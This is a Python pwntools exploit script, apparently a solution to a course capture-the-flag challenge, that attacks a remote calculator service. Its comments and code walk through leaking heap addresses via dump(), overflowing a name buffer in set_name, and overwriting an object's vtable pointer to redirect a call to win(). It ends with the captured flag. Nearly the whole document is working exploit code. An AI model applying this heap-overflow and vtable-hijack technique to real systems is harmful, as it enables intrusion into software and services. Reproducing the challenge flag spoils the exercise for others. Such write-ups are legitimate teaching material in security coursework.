from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
# memcpy
#b win
#b vuln.cpp:211
#b *Calculator::rename_expr(std::basic_string_view<char, std::char_traits<char> >, std::basic_string_view<char, std::char_traits<char> >)+531
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33068)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/calc") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


p.recvuntil(b"win() is at 0x")
win_addr = int(p.recvline().decode(), 16)
print("Win is at:", hex(win_addr))

# raw_name OOB in Calculator
# set_name takes name.length now sizeof(raw_name) for memcpy


# we create a vtable pointing on win()
# we can use dump(variable) to call win() from the vtable
# with overflow in set_name we can overwrite vtable ptr of the next expression in heap (create two expressions, overwrite second with overflow on editing the first one)

# it's possible to create an expr with "pow(3, 4)" for example
# this turns into a reserved expression such as v0
# we can then reassign a new name, for example "bbbbbbbbbbbbbbbbbbbb := v0"

# dump leaks heap for free!

p.sendline(b"pow(1, 3)")
p.sendlineafter(b"v0 := pow(1, 3)\n", b"dump(v0)")
heap_leak_1 = int(p.recvline()[3:17], 16) + 8*6 # - 0x13f10
print("heap leak: ", hex(heap_leak_1))


p.sendline(b"pow(1, 3)") #v1 that we will try to overwrite next
p.sendlineafter(b"v1 := pow(1, 3)\n", b"dump(v1)")
heap_leak_2 = int(p.recvline()[3:17], 16)
print("heap leak: ", hex(heap_leak_2))


payload = (p64(win_addr)*4).ljust(heap_leak_2-heap_leak_1, b"A") + p64(heap_leak_1)
payload = b"".ljust(heap_leak_2-heap_leak_1, b"A") + p64(heap_leak_1+8)


p.sendline(payload + b" := v0")


# remove null bytes so we can rename again
p.sendline(b"next_stage := " + payload[:-2])
payload2 = b"A"*8 + p64(win_addr)*20
p.sendline(payload2 + b" := next_stage")

# tried dumping v0 instead of v1 at the beginning -_-
# but after overwriting the vtable ptr for v1, I obviously needed to dump v1 ^^"
p.sendline(b"dump(v1)")


p.interactive()

#softsec{gJZJZndAxadrhYSILO3nYXYJEuoH7cogmxxNCZMocqX7XT1ODq0HlEEV131mf3Gr}